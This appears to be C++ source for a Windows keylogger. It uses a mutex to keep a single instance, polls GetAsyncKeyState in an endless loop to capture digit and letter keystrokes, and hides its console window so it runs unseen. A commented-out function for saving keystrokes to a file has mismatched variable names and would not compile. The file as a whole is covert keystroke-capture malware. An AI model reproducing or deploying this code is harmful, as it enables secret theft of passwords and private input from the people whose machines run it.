#include "DDaria.h"

bool onlyOne()
{
	CreateMutex(NULL, TRUE, "fUwPNYJwEa#Zj#PIufiPh#t!1sO*7L2VRnG$#YF%JP2_GMD");
	
	if (GetLastError() == ERROR_ALREADY_EXISTS)
	{
		return true;
	}
	
	else
	{
		return false;
	}
}


void turnOn()
{
	short l;
	short temp;
	short character;
	while (1)
	{
		Sleep(10);
		
		
		// 1 - &*
		for (l = 48; l < 58; l++)
		{
			temp = GetAsyncKeyState(l);

			if (temp == -32767 && GetAsyncKeyState(VK_SHIFT))
			{
				cout << (char)(l - 16);
			}
			else if (temp == -32767 && !GetAsyncKeyState(VK_SHIFT))
			{
				cout << (char)l;

			}

		}

		// A-Z
		for (l = 65; l < 91; l++)
		{
			temp = GetAsyncKeyState(l);

			if (temp == -32767 && !GetAsyncKeyState(VK_SHIFT))
			{

				cout << (char)(l + 32);

			}
			else if (temp == -32767 && GetAsyncKeyState(VK_SHIFT))
			{
				cout << (char)l;
			}
		}
		

	}
}
void hide()
{

	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);
}

/*
void save(int liczba)
{
	FILE * file;
	file = fopen( "xd.txt", "w+");
	if (plik != NULL)
	{
		fputc((char)liczba, plik);
		fclose(plik);
	}
}
*/